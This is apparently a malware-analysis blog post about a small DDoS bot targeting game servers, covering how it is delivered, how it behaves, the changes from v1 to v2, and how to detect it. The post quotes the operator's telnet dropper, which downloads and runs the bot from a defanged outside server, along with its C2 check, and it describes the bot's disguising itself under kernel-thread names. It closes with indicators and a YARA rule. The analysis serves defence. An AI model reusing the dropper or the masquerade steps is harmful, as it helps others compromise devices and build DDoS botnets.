focus_full_bot: a DDoS bot rebuilt overnight

A small game-server DDoS bot whose operator shipped v2 to every architecture a day after v1.

Contents

  • Delivery
  • The bot
  • v1 to v2
  • Known vs. new

One server, 169.128.70[.]53 (AS214693, Fusiora), does everything. It logs in over telnet, serves the bot on port 8000 and runs the C2 on 7002. On 19 November it served v1 of a bot whose source file is focus_full_bot.c. By the morning of 20 November it was serving v2 for both ARM and x86_64. Static analysis only.

Delivery

The operator’s server logs in on telnet port 2323 as root/root, checks uname -m and echo SHELL_TEST, then pastes one line:

pkill -9 -f bot_armv7l_c; rm -f /tmp/bot_armv7l_c;
(curl -fsSL -o /tmp/bot_armv7l_c hxxp://169.128.70[.]53:8000/bot_armv7l_c || wget ... || busybox wget ... || python3 urllib ... || python urllib ...);
chmod 755 /tmp/bot_armv7l_c; (nohup ... &); (setsid ... &); (... &); sleep 2;
[ size > 2000 ] && echo DROP_OK || echo DROP_SMALL

It then checks for the C2 connection itself:

(ss -tn || netstat -tn) | grep -q 169.128.70[.]53:7002 && echo C2OK || echo C2NO
busybox netstat -tn | grep 1B5A | grep ESTABLISHED      # 0x1B5A = 7002

A shorter variant saves the file as /tmp/bin_86. The loader checks whether the drop and the C2 connection worked, and nothing else spreads the bot. The scanning, login and drop all come from the operator’s own server.

The bot

The bot is a static glibc ELF built with GCC (Ubuntu 15.2.0-16ubuntu1). It has no persistence, no killer and no scanner. On start it:

  1. Double-forks, calls setsid, chdir("/"), points stdio at /dev/null and ignores SIGCHLD, HUP, INT, TERM and PIPE.
  2. Renames itself with prctl(PR_SET_NAME).
  3. Seeds a SplitMix64 RNG from /dev/urandom, the time and the pid.
  4. Finds its source IP by routing toward 8.8.8[.]8, which it needs for raw packets.
  5. Connects to 169.128.70[.]53:7002, sends BOT|<arch> and waits for !<vector> <target> <port> <seconds>.

v1 kept its symbols. They show one dispatcher (launch) and six flood routines: vector_tcp, vector_syn, vector_udp, vector_discord, vector_game and the HTTP flood. The targets are game servers and their hosts: FiveM, Minecraft and MCPE, Discord voice, and OVH-protected servers.

The arch check covers x86_64, amd64, i386, i686, aarch64, armv8, arm64, armv7, armv6, mipsel, mipsle and mips. I have only seen the ARM and x86_64 builds.

The server stopped answering for a short time on the night of 19 November and came back with v2. Each version is the same code on ARM and x86_64, so this is one source tree built for every target and redeployed at once. Most of the changes look like fixes for problems from day one: v1 sent a startup flood at 8.8.8[.]8, ran a fixed 512 threads per core that a 256 MB router can’t survive, and used a process name that collides with PID 2. That reading is mine, based on the code.

I’m watching for a v3 and will update this post if one shows up.

Detection

  • TCP to port 7002 that starts with BOT|
  • A process named [kthreadd] or [kworker/0:1] whose /proc/<pid>/exe is under /tmp
  • Telnet input that contains echo C2OK || echo C2NO or DROP_OK
rule focus_full_bot
{
    strings:
        $src  = "focus_full_bot.c"
        $reg1 = "BOT|%s cores=%d ram=%ldKB"
        $reg2 = { 00 42 4F 54 7C 25 73 00 }   // "\0BOT|%s\0"
        $c1 = "!udp-gbps"
        $c2 = "!discord"
        $c3 = "!fivem"
        $c4 = "!hbh"
        $c5 = "!mbm"
        $c6 = "!http-ovh"
        $c7 = "!ovh-flood"
        $c8 = "!home-holder"
    condition:
        uint32(0) == 0x464c457f and ($src or (1 of ($reg*) and 3 of ($c*)))
}

It matches all four builds.
